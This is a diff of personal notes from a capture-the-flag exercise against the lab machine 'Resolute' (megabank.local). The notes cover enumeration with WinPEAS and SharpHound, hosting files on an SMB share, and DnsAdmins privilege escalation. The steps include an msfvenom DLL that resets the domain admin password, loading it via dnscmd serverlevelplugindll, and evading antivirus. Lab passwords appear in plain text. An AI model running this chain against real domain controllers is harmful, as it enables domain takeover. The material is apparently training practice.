@@ -5,6 +5,9 @@ PowerShell transcript log is discovered, which has captured credentials passed o
 This is used to move laterally to a user that is a member of the DnsAdmins group.
 This group has the ability to specify that the DNS Server service loads a plugin DLL. 
 After restarting the DNS service, we achieve command execution on the domain controller in the context of `NT_AUTHORITY\SYSTEM`. 
+LDAP ENUM
+SMB SERVER
+DNS DLL ADMIN PRIV ESC
 #########
 Resolute:
 
@@ -99,13 +102,13 @@ Resolute:
             *Evil-WinRM* PS C:\users\melanie\Downloads> upload winPEASx64.exe
 
 
-###############################################################################################
     Windows Melanie Account Ennumeration:
         Nothing crazy via WinPEAS
 
         We will user BloodHound:
             *Evil-WinRM* PS C:\Users\melanie\Downloads> .\SharpHound.exe -c all --zipfilename MSedgeMap
 
+#################################SMB Server Creation##############################################
 
     We'll create our SMB Share to get BloudHound datas:
         on Kali:
@@ -168,4 +171,68 @@ Resolute:
             SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
             SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
 
+
     
+    We will inject a DLL into DNSADMINISTARTOR@MEGABANK.LOCAL to escalate our privileges:
+        DNSAdmin - AD Exploit:
+            https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
+
+
+            This method can be used when we have access to user account who happens to be a member of DNSAdmins group
+            or
+            When the compromised user account has write privileges to a DNS server object
+
+
+###########################################PRIVILEGE ADMIN ESCALATION VIA DNS DLL ###############################################################################################
+
+
+            Check if a user is in DNSAdmins group:
+                net user ryan /domain
+
+
+            We load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., 
+            We will build a DLL which contains admin priv esc code and inject it into dns.exe process on the victim’s DNS Server (DC).
+            
+
+            Looks like the server does not even do any verification on the dll path specified in this operation :
+            https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
+            
+                non-staged payload - we just tryed to modify Admin Passwd:
+                    msfvenom -p windows/x64/exec cmd='net user administrator Adib1234@! /domain' -f dll > dnsSecAD.dll
+
+
+            Skip Defender + A.V - Hosting the payload:
+                Once the payload is generated,
+                we will use smb server to host the file. We are choosing this, because windows supports UNC paths and samba shares by default. 
+                Also, there are times when the victim’s AV or defender may delete the payload if uploaded, so we’ll stick with smb server for this one.
+
+                WE REUSE OUR SMB SERVER:
+                    We check if it is joignable from the Windows machine:
+                        Evil-WinRM* PS C:\Users\ryan\Documents> net view \\<KALI IP> 
+                            Shared resources at <KALI IP>
+
+                            (null)
+
+                            Share name  Type  Used as  Comment
+
+                            -------------------------------------------------------------------------------
+                            COOL        Disk  (UNC)
+                            The command completed successfully.
+
+            TO EXECUTE THE DNS SERVICE with the Privilege Admin Escalation Payload:
+                *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
+                OR IF it fails try:
+                    dnscmd megabank.local /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
+
+                sc.exe \\resolute stop dns
+
+                sc.exe \\resolute start dns
+
+
+            We connect with new creds:
+                evil-winrm -i 10.10.10.169 -u administrator  -p Adib1234@!
+
+
+
+ 
+                
